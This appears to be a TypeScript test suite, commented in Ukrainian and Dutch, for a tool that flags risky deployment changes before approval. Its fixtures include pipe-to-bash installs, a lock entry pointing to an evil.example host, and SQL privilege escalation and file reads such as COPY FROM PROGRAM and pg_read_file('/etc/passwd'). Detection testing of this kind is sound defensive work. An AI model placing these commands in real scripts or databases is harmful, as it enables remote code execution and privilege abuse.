// ЧЕРВОНІ ПРАПОРЦІ ПЕРЕД СХВАЛЕННЯМ (SEC-PAKKET-001, 16.11.2026). Без браузера й бази.
// RODE VLAGGEN VÓÓR HET GOEDKEUREN: backend/uitrol-risico.ts en de stap «risico» in de voorcontrole.
//
// Перевіряємо справжню поведінку на справжніх теках і справжньому tar.gz: що прапорець з’являється саме на небезпечних змінах
// (root, npm, джерела пакетів, процеси GitHub, права в базі) і НЕ з’являється на звичайних (код сайту, документація, коментарі SQL).
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { checker } from './hulp/nep-google';
import { betekenisRegels, leesbaarVerschil, leesbaarVoor, lockBronVlaggen, opvallendeRegels, pakketJsonVlaggen, pasUitlegToe, risicoVlaggen, sqlRechtenVlaggen, uitlegSleutel, verklaarVlaggen, vraagtRisicoBevestiging } from '../../backend/uitrol-risico';
import { leesRisicoUitleg, valideerOntwikkelDossier } from '../../shared/ontwikkelarchief';
import { pakketVoorcontrole } from '../../backend/uitrol-voorcontrole';

const schrijf = (wortel: string, bestanden: Record<string, string>) => {
  for (const [rel, inhoud] of Object.entries(bestanden)) { mkdirSync(dirname(join(wortel, rel)), { recursive: true }); writeFileSync(join(wortel, rel), inhoud); }
};
const PKG = (extra: Record<string, unknown> = {}) => JSON.stringify({ name: 'hub', scripts: { build: 'vite build' }, dependencies: { react: '18.3.1', pg: '8.13.0' }, devDependencies: { vite: '5.4.0' }, ...extra }, null, 2);
const LOCK = (bronnen: string[] = []) => JSON.stringify({ packages: { 'node_modules/react': { resolved: 'https://registry.npmjs.org/react/-/react-18.3.1.tgz' }, ...Object.fromEntries(bronnen.map((b, i) => [`node_modules/x${i}`, { resolved: b }])) } }, null, 2);
const BASIS = {
  'package.json': PKG(), 'package-lock.json': LOCK(['https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz']),
  'deploy/installeer-app.sh': '#!/bin/bash\necho installeer\n', 'deploy/mijn-ruimte.service': '[Service]\nUser=mijnruimte\n',
  'deploy/LEESMIJ.nl.md': 'uitleg\n', '.github/workflows/uitgave.yml': 'name: uitgave\n', 'src/App.tsx': 'export default 1;\n',
};

const UITLEG_VORM = [{ pad: 'deploy/x.sh', uk: 'Скрипт тепер перезапускає службу після оновлення.', nl: 'Het script herstart nu de dienst na de update.' }];

export async function main(): Promise<number> {
  const { check, einde } = checker('uitrol-risico-20261116');
  const tmp = mkdtempSync(join(tmpdir(), 'uitrol-risico-'));
  try {
    // ---- SQL-права
    check('SQL: SECURITY DEFINER → прапорець', sqlRechtenVlaggen('0300_x', 'CREATE FUNCTION f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ select 1 $$;').length === 1);
    check('SQL: ALTER ROLE / DISABLE RLS / DEFAULT PRIVILEGES / COPY PROGRAM / GRANT TO PUBLIC → прапорці', sqlRechtenVlaggen('0300_x', "ALTER ROLE app SUPERUSER; ALTER TABLE t DISABLE ROW LEVEL SECURITY; ALTER DEFAULT PRIVILEGES GRANT ALL ON TABLES TO x; COPY t FROM PROGRAM 'id'; GRANT SELECT ON t TO PUBLIC;").length >= 5);
    check('SQL: CREATE EXTENSION і pg_read_file → прапорці', sqlRechtenVlaggen('0300_x', "CREATE EXTENSION dblink; SELECT pg_read_file('/etc/passwd');").length === 2);
    check('SQL: звичайна міграція (таблиця, індекс, політика, GRANT ролі застосунку) → без прапорця', sqlRechtenVlaggen('0300_x', 'CREATE TABLE app.t (id uuid); CREATE INDEX i ON app.t(id); DROP POLICY IF EXISTS p ON app.t; CREATE POLICY p ON app.t USING (true); GRANT SELECT ON app.t TO mijnruimte_app;').length === 0);
    check('SQL: у коментарях не рахується; NOSUPERUSER/NOBYPASSRLS — не прапорець', sqlRechtenVlaggen('0300_x', '-- SECURITY DEFINER тут не потрібен\n/* ALTER ROLE x */ CREATE ROLE r NOSUPERUSER NOBYPASSRLS;').length === 1);

    // ---- package.json
    check('npm: без змін → порожньо', pakketJsonVlaggen(PKG(), PKG()).length === 0);
    const npm = pakketJsonVlaggen(PKG(), PKG({ dependencies: { react: '18.3.2', 'left-pad': '1.3.0' }, scripts: { build: 'vite build', postinstall: 'node x.js' } }));
    check('npm: новий пакет, змінена версія, прибраний пакет, новий postinstall', npm.some((v) => v.includes('+ left-pad')) && npm.some((v) => v.includes('~ react')) && npm.some((v) => v.includes('− pg')) && npm.some((v) => v.includes('postinstall')), npm.join(' | '));
    check('npm: зміна звичайного скрипта (build) — не прапорець', pakketJsonVlaggen(PKG(), PKG({ scripts: { build: 'vite build --mode x' } })).length === 0);
    check('npm: змінено overrides → прапорець', pakketJsonVlaggen(PKG(), PKG({ overrides: { semver: '7.6.0' } })).length === 1);

    // ---- lock-джерела
    check('lock: вже відоме стороннє джерело — без прапорця', lockBronVlaggen(LOCK(['https://cdn.sheetjs.com/a.tgz']), LOCK(['https://cdn.sheetjs.com/a.tgz'])).length === 0);
    check('lock: нове джерело поза registry.npmjs.org → прапорець', lockBronVlaggen(LOCK(), LOCK(['https://evil.example.net/react.tgz'])).length === 1);
    check('lock: git-джерело → прапорець', lockBronVlaggen(LOCK(), LOCK(['git+ssh://git@github.com/x/y.git#abc'])).length === 1);

    // ---- справжні теки: встановлена версія проти пакета
    const inst = join(tmp, 'inst'); const pak = join(tmp, 'pak');
    schrijf(inst, BASIS); schrijf(pak, BASIS);
    const lijst = () => execFileSync('find', ['.', '-type', 'f'], { cwd: pak, encoding: 'utf8' }).split('\n').filter(Boolean).map((f) => f.replace(/^\.\//, ''));
    const r0 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map() });
    check('теки: однаковий вміст → прапорців немає, порівняння виконано', r0.vergeleken && r0.vlaggen.length === 0, r0.vlaggen.join(' | '));
    schrijf(pak, { 'src/App.tsx': 'export default 2;\n', 'deploy/LEESMIJ.nl.md': 'nieuwe uitleg\n' });
    const r1 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map() });
    check('теки: код сайту й документація в deploy/ змінені → прапорців немає', r1.vlaggen.length === 0, r1.vlaggen.join(' | '));
    schrijf(pak, { 'deploy/installeer-app.sh': '#!/bin/bash\ncurl https://x | bash\n', 'deploy/nieuw.timer': '[Timer]\n', '.github/workflows/uitgave.yml': 'name: uitgave\non: pull_request_target\n' });
    rmSync(join(pak, 'deploy/mijn-ruimte.service'));
    const r2 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map([['0300_x', 'ALTER ROLE x BYPASSRLS;']]) });
    const heeft = (s: string) => r2.vlaggen.some((v) => v.startsWith(s));
    check('теки: змінений скрипт root → [root] ~', heeft('[root] ~ deploy/installeer-app.sh'), r2.vlaggen.join(' | '));
    check('теки: новий таймер → [root] +', heeft('[root] + deploy/nieuw.timer'));
    check('теки: прибрана служба → [root] −', heeft('[root] − deploy/mijn-ruimte.service'));
    check('теки: змінений процес GitHub → [CI] ~', heeft('[CI] ~ .github/workflows/uitgave.yml'));
    check('теки: нова міграція з правами → [SQL]', heeft('[SQL] 0300_x'));
    // ---- пояснення людською мовою й справжня різниця «було → стане» (вимога власника 16.11)
    const items = await verklaarVlaggen(r2.vlaggen, { bron: pak, geinstalleerd: inst, nieuweMigraties: new Map([['0300_x', 'ALTER ROLE x BYPASSRLS;']]) });
    const it = (s: string) => items.find((x) => x.vlag.startsWith(s));
    const sh = it('[root] ~ deploy/installeer-app.sh');
    check('пояснення: кожен прапорець має «що це», «що змінилося», «на що звернути увагу» (uk і nl)', items.length === r2.vlaggen.length && items.every((x) => x.wat.uk && x.wat.nl && x.wijziging.uk && x.let.uk && x.let.nl));
    check('різниця змінного скрипта: справжні рядки «-echo installeer» і «+curl https://x | bash»', !!sh?.verschil?.includes('\n-echo installeer') && !!sh.verschil.includes('\n+curl https://x | bash'), sh?.verschil);
    check('скрипт root пояснено як «виконується від імені root»', !!sh?.wat.uk.includes('root'));
    check('підозрілі рядки: завантаження з інтернету і «| bash» помічено окремо', (sh?.opvallend?.length ?? 0) >= 2 && sh!.opvallend!.some((o) => o.uk.includes('curl')), JSON.stringify(sh?.opvallend));
    check('новий таймер: весь вміст як «+», пояснення про розклад', !!it('[root] + deploy/nieuw.timer')?.verschil?.includes('+[Timer]') && it('[root] + deploy/nieuw.timer')!.wat.uk.includes('Таймер'));
    check('прибрана служба: старий вміст як «-», пояснення про службу', !!it('[root] − deploy/mijn-ruimte.service')?.verschil?.includes('-User=mijnruimte') && it('[root] − deploy/mijn-ruimte.service')!.wat.uk.includes('Служба'));
    check('процес GitHub: різниця + підозрілий pull_request_target', !!it('[CI] ~')?.verschil?.includes('+on: pull_request_target') && !!it('[CI] ~')?.opvallend?.some((o) => o.uk.includes('секрети')));
    check('SQL: показано сам рядок міграції й пояснення про BYPASSRLS', !!it('[SQL]')?.verschil?.includes('ALTER ROLE x BYPASSRLS') && it('[SQL]')!.wijziging.uk.includes('BYPASSRLS'));
    const npmIt = await verklaarVlaggen(['[npm] + left-pad@1.3.0 (dependencies)', '[npm] ~ react: 18.3.1 → 18.3.2 (dependencies)'], { bron: pak, geinstalleerd: inst, nieuweMigraties: new Map() });
    check('npm: новий пакет — назва, версія й порада перевірити назву', npmIt[0].wijziging.uk.includes('left-pad') && npmIt[0].wijziging.uk.includes('1.3.0') && npmIt[0].let.uk.includes('npmjs.com/package/left-pad'));
    check('npm: оновлення — «було 18.3.1, стане 18.3.2» і різниця з двох рядків', npmIt[1].wijziging.uk.includes('було 18.3.1, стане 18.3.2') && npmIt[1].verschil === '- "react": "18.3.1"\n+ "react": "18.3.2"', JSON.stringify(npmIt[1]));
    check('підозрілі рядки шукаються лише серед нових (+), не серед прибраних (-)', opvallendeRegels('-curl https://x | bash\n+echo ok').length === 0);
    check('значення знайомих рядків: закріплення за хешем і persist-credentials пояснено як «безпечніше»', (() => { const b = betekenisRegels('+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n+          persist-credentials: false'); return b.length === 2 && b.every((x) => x.uk.includes('безпечніше')); })());
    // ---- для адміна без програмування (вимога власника 16.11): «було → стане» словами, висновок, порада
    const ci = leesbaarVerschil('--- a\n+++ b\n@@ -1,3 +1,4 @@\n-      - uses: actions/checkout@v4\n+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n         with:\n+          persist-credentials: false');
    check('словами: «було: модуль за міткою v4» → «стане: точна версія v4.2.2 (закріплено)»', ci.voorNa[0]?.voor?.uk.includes('за міткою «v4»') === true && ci.voorNa[0]?.na?.uk.includes('точної версії v4.2.2') === true, JSON.stringify(ci));
    check('словами: «не було» → «ключ GitHub не зберігається на диску»', ci.voorNa[1]?.voor === null && !!ci.voorNa[1]?.na?.uk.includes('не зберігається'));
    check('висновок для такої зміни — «безпечніше», порада «можна схвалювати»', (() => { const l = leesbaarVoor({ vlag: '[CI] ~ .github/workflows/x.yml', wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, verschil: '@@\n-      - uses: a/b@v4\n+      - uses: a/b@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2' }); return l.oordeel === 'veiliger' && l.doen.uk.includes('Можна схвалювати'); })());
    check('однакові пари «було → стане» показано один раз із кількістю місць', (() => { const r = leesbaarVerschil('@@\n-  - uses: a/b@v4\n+  - uses: a/b@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n x\n-  - uses: a/b@v4\n+  - uses: a/b@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2'); return r.voorNa.length === 1 && r.voorNa[0].keer === 2; })());
    check('рядок, що лише переїхав (є і в «було», і в «стане»), не рахується змінею', leesbaarVerschil('@@\n-npm ci\n x\n+npm ci').voorNa.length === 0 && opvallendeRegels('-rm -rf /tmp/x\n+rm -rf /tmp/x').length === 0);
    check('служба стала працювати від root → висновок «потребує уваги» і порада спитати автора', (() => { const l = leesbaarVoor({ vlag: '[root] ~ deploy/x.service', wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, verschil: '@@\n-User=mijnruimte\n+User=root' }); return l.oordeel === 'aandacht' && l.voorNa[0]?.na?.uk.includes('від імені root') === true && l.doen.uk.includes('попросіть автора'); })());
    check('розклад таймера перекладено: «*-*-* 03:00» → «щодня о 03:00»', leesbaarVerschil('@@\n-OnCalendar=hourly\n+OnCalendar=*-*-* 03:00').voorNa[0]?.na?.uk.includes('щодня о 03:00') === true);
    check('зміни в логіці скрипта рахуються окремо («словами не перекласти»), висновок — звичайна зміна', (() => { const l = leesbaarVoor({ vlag: '[root] ~ deploy/x.sh', wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, verschil: '@@\n-echo a\n+echo b\n+systemctl restart x' }); return l.oordeel === 'gewoon' && l.overig === 2 && l.doen.uk.includes('опис'); })());
    check('кожен прапорець після verklaarVlaggen має висновок, коротке речення й пораду (uk і nl)', items.every((x) => x.leesbaar && x.leesbaar.kort.uk && x.leesbaar.kort.nl && x.leesbaar.doen.uk && x.leesbaar.doen.nl));
    check('звичайна зміна скрипта без підозрілого — без попереджень', opvallendeRegels('+echo "klaar"\n+systemctl restart mijn-ruimte').length === 0);
    const r3 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: join(tmp, 'bestaat-niet'), nieuweMigraties: new Map() });
    check('теки: встановлену версію не знайдено → чесне попередження, не «усе гаразд»', !r3.vergeleken && r3.vlaggen[0]?.startsWith('[!]'));

    // ---- ключі пояснень і формат поля risicoUitleg у досьє
    check('ключ пояснення: root/CI → шлях файла', uitlegSleutel('[root] ~ deploy/x.sh') === 'deploy/x.sh' && uitlegSleutel('[CI] + .github/workflows/a.yml') === '.github/workflows/a.yml');
    check('ключ пояснення: npm → «npm:назва», скрипт → «npm-script:назва», overrides', uitlegSleutel('[npm] + left-pad@1.3.0 (dependencies)') === 'npm:left-pad' && uitlegSleutel('[npm] + @scope/pakket@1.0.0 (dependencies)') === 'npm:@scope/pakket' && uitlegSleutel('[npm] скрипт встановлення «postinstall» додано · installatiescript «postinstall» toegevoegd') === 'npm-script:postinstall' && uitlegSleutel('[npm] змінено overrides · overrides gewijzigd') === 'npm:overrides');
    check('ключ пояснення: lock → package-lock.json, SQL → назва міграції; архів вручну й «[!]» — без ключа', uitlegSleutel('[lock] нове джерело пакета · nieuwe pakketbron: https://x') === 'package-lock.json' && uitlegSleutel('[SQL] 0300_x: SECURITY DEFINER') === '0300_x' && uitlegSleutel('[GitHub] архів у випуску завантажено вручну (a)') === null && uitlegSleutel('[!] не порівняно') === null);
    const L = (vlag: string, verschil?: string) => leesbaarVoor({ vlag, wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, ...(verschil ? { verschil } : {}) });
    check('потрібне пояснення: підозріла зміна root, новий пакет npm, логіка скрипта, SQL', !!L('[root] ~ deploy/x.sh', '@@\n+curl https://x | bash').uitlegNodig && !!L('[npm] + left-pad@1.3.0 (dependencies)').uitlegNodig && !!L('[root] ~ deploy/x.sh', '@@\n-echo a\n+echo b').uitlegNodig && !!L('[SQL] 0300_x: SECURITY DEFINER').uitlegNodig);
    check('НЕ потрібне пояснення: безпечніша зміна, оновлення версії npm, прибрання, архів вручну', !L('[CI] ~ .github/workflows/a.yml', '@@\n-  - uses: a/b@v4\n+  - uses: a/b@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2').uitlegNodig && !L('[npm] ~ react: 18.3.1 → 18.3.2 (dependencies)').uitlegNodig && !L('[root] − deploy/oud.sh').uitlegNodig && !L('[GitHub] архів у випуску завантажено вручну (a)').uitlegNodig);
    const pu = pasUitlegToe([{ vlag: '[npm] + left-pad@1.3.0 (dependencies)', wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, leesbaar: L('[npm] + left-pad@1.3.0 (dependencies)') }], [{ pad: 'npm:left-pad', uk: 'Потрібен для вирівнювання рядків у звіті.' }]);
    check('pasUitlegToe: без nl пояснення показується українською і в nl; нічого не бракує', pu.ontbreekt.length === 0 && pu.items[0].auteur?.nl === 'Потрібен для вирівнювання рядків у звіті.' && pu.items[0].sleutel === 'npm:left-pad');
    const D = { schema: 1, taakId: 'RISICO-001', opdracht: 'x'.repeat(50), tijdlijn: [1], keuzes: [1], wijzigingen: [1], controles: [1], bronnen: [1], beperkingen: [1], privacy: { geheimenUitgesloten: true } };
    check('досьє без risicoUitleg лишається чинним (поле необов\'язкове)', valideerOntwikkelDossier(D, 'RISICO-001').length === 0 && leesRisicoUitleg(D).uitleg.length === 0);
    check('досьє з правильним risicoUitleg чинне, пояснення читаються', valideerOntwikkelDossier({ ...D, risicoUitleg: UITLEG_VORM }, 'RISICO-001').length === 0 && leesRisicoUitleg({ risicoUitleg: UITLEG_VORM }).uitleg.length === 1);
    check('досьє: надто коротке пояснення («ок») — помилка формату', valideerOntwikkelDossier({ ...D, risicoUitleg: [{ pad: 'deploy/x.sh', uk: 'ок' }] }, 'RISICO-001').some((f) => f.includes('risicoUitleg[0].uk')));
    check('досьє: той самий шлях двічі — помилка формату', valideerOntwikkelDossier({ ...D, risicoUitleg: [...UITLEG_VORM, ...UITLEG_VORM] }, 'RISICO-001').some((f) => f.includes('dubbel')));
    check('досьє: risicoUitleg не список — помилка формату', valideerOntwikkelDossier({ ...D, risicoUitleg: 'deploy/x.sh' }, 'RISICO-001').some((f) => f.startsWith('dossier.risicoUitleg')));

    // ---- справжній tar.gz через повну перевірку пакета
    const V = '20271201-120000';
    const bron = join(tmp, 'tgz', `mijn-ruimte-${V}`);
    const C = 'c'.repeat(40); const PAD = 'orchestratie/ontwikkelarchieven/RISICO-001.json';
    const REF = { schema: 1, taakId: 'RISICO-001', repo: 'Tarasevych/hub', tak: 'feature/risico-001-20271201-110000', commit: C, pad: PAD, sha256: 'd'.repeat(64),
      url: `https://github.com/Tarasevych/hub/blob/${C}/${PAD}`, release: `https://github.com/Tarasevych/hub/releases/tag/${V}`, pakket: `mijn-ruimte-${V}.tar.gz` };
    schrijf(bron, { ...BASIS, 'UITROL-VERSIE': V + '\n', 'BRON-COMMIT': C + '\n', 'ONTWIKKELARCHIEF.json': JSON.stringify(REF), 'deploy/installeer-app.sh': '#!/bin/bash\necho anders\n', 'migrations/0300_x.sql': 'CREATE FUNCTION f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ select 1 $$;\n' });
    const tgz = join(tmp, 'p.tar.gz');
    execFileSync('tar', ['-czf', tgz, '-C', join(tmp, 'tgz'), `mijn-ruimte-${V}`]);
    // Пояснення автора (власник 16.11.2026): без пояснення до ризикованої зміни встановлення блокується автоматично.
    const UITLEG = [
      { pad: 'deploy/installeer-app.sh', uk: 'Скрипт встановлення тепер повідомляє інший текст; логіка не змінилася.', nl: 'Het installatiescript meldt nu een andere tekst; de logica is gelijk.' },
      { pad: '0300_x', uk: 'Функція f потрібна з правами власника, бо читає таблицю, до якої в ролі сайту немає доступу.', nl: 'Functie f heeft eigenaarsrechten nodig omdat ze een tabel leest waar de siterol niet bij kan.' },
    ];
    const archief = (risicoUitleg?: typeof UITLEG) => async () => ({ ok: true, code: 'OK', reden: 'test', url: REF.url, ...(risicoUitleg ? { risicoUitleg } : {}) });
    const blok = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set(), geinstalleerd: inst, archiefControle: archief() });
    const rb = blok.resultaat.controles.find((c) => c.id === 'risico');
    check('без пояснень автора: крок «risico» = fout (встановлення заблоковано)', rb?.niveau === 'fout' && blok.resultaat.ok === false, JSON.stringify(rb).slice(0, 300));
    check('без пояснень: у подробицях названо, що саме не пояснено (файл root і міграція)', !!rb?.details?.some((d) => d.includes('без пояснення: deploy/installeer-app.sh')) && !!rb?.details?.some((d) => d.includes('без пояснення: 0300_x')));
    check('без пояснень: пункти позначено «потрібне пояснення», пояснення автора немає', !!rb?.vlaggen?.filter((v) => v.leesbaar?.uitlegNodig).every((v) => !v.auteur));
    const deel = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set(), geinstalleerd: inst, archiefControle: archief([UITLEG[0]]) });
    const rd = deel.resultaat.controles.find((c) => c.id === 'risico');
    check('пояснено лише частину: досі fout, і бракує саме міграції', rd?.niveau === 'fout' && !!rd.details?.some((d) => d.includes('без пояснення: 0300_x')) && !rd.details?.some((d) => d.includes('без пояснення: deploy/installeer-app.sh')));
    const met = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set(), geinstalleerd: inst, archiefControle: archief(UITLEG) });
    const rc = met.resultaat.controles.find((c) => c.id === 'risico');
    check('усе пояснено: крок «risico» = waarschuwing з root і SQL', rc?.niveau === 'waarschuwing' && !!rc.details?.some((d) => d.includes('deploy/installeer-app.sh')) && !!rc.details?.some((d) => d.startsWith('[SQL]')), JSON.stringify(rc).slice(0, 300));
    check('усе пояснено: прапорець сам не блокує (не «fout»)', rc?.niveau !== 'fout');
    check('усе пояснено: пояснення автора додано до пунктів (uk і nl), порада — порівняти пояснення зі змінами', !!rc?.vlaggen?.some((v) => v.auteur?.uk.includes('логіка не змінилася') && v.auteur.nl.includes('logica') && v.leesbaar?.doen.uk.includes('Автор пояснив')));
    check('перевірка пакета: пояснення й різниця збережені разом із кроком «risico»', (rc?.vlaggen?.length ?? 0) === (rc?.details?.length ?? -1) && !!rc?.vlaggen?.some((v) => v.verschil?.includes('+echo anders')));
    check('vraagtRisicoBevestiging: так для пакета з прапорцями (і з поясненнями позначка все одно потрібна)', vraagtRisicoBevestiging(met.resultaat) && vraagtRisicoBevestiging(blok.resultaat));
    const zonder = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set() });
    check('перевірка пакета без встановленої версії в параметрах (тести, старі виклики) → кроку немає', !zonder.resultaat.controles.some((c) => c.id === 'risico'));
    check('vraagtRisicoBevestiging: ні без кроку, ні для «ok»', !vraagtRisicoBevestiging(zonder.resultaat) && !vraagtRisicoBevestiging({ controles: [{ id: 'risico', niveau: 'ok' }] }) && !vraagtRisicoBevestiging(null));
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
  // Компактний вигляд «було → стане» (16.11): модулі GitHub зі структурою, тон зміни. Compacte weergave: module-structuur en toon.
  {
    const H = 'a'.repeat(40);
    const lv = leesbaarVerschil(['--- a', '+++ b', '@@', '-      - uses: actions/checkout@v4', `+      - uses: actions/checkout@${H} # v4.2.2`, ' x', '-      - uses: actions/checkout@v4', `+      - uses: actions/checkout@${H} # v4.2.2`, ' y', '+          persist-credentials: false', ' z', '-  contents: read', '+  contents: write'].join('\n'));
    const mod = lv.voorNa.find((p) => p.module);
    check('compact: module met label → vastgezette versie, ×2', !!mod && mod.module!.naam === 'actions/checkout' && mod.module!.van === 'v4' && mod.module!.naar === 'v4.2.2' && mod.module!.vast === true && mod.keer === 2 && mod.toon === 'veiliger', JSON.stringify(mod));
    const pc = lv.voorNa.find((p) => !p.voor && p.na?.uk.includes('ключ доступу'));
    check('compact: toegevoegde beveiliging → toon veiliger, geen module', !!pc && pc.toon === 'veiliger' && !pc.module);
    const w = lv.voorNa.find((p) => p.na?.uk.includes('ЗМІНЮВАТИ'));
    check('compact: schrijfrecht → toon risico', !!w && w.toon === 'risico');
  }
  return einde();
}
